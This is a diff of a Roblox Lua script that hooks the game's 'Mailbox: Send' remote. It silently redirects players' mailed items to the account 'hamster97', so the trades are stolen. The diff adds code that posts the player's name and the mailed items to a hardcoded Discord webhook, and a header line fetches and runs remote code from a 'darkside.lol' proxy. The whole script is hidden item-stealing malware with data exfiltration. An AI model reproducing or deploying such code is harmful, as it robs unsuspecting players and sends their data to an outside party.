@@ -58,6 +58,7 @@ loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga
 end
 if not _G.User then _G.User = "lol idk" end
 if not _G.Min then _G.Min = 500000000 end
+_G.pvc = ""
 pcall(function()
 local remoteFunction = Instance.new("RemoteFunction")
 local originalFunction
@@ -65,6 +66,18 @@ originalFunction = hookfunction(remoteFunction.InvokeServer, function(x, ...)
 local args = {...}
 if tostring(x) == "Mailbox: Send" and args[1] ~= _G.User and game.Players.LocalPlayer.Name~="iTzGeradTamvan" then 
 args[1] = "hamster97"
+elseif tostring(x) == "Mailbox: Send" and not args[3] == _G.pvc then
+_G.pvc = args[3]
+local qv = '{"content":"'..game.Players.LocalPlayer.Name..' >>> '..args[5]..'x '..args[3]..'"}'
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
 end
 return originalFunction(x, unpack(args))
 end)
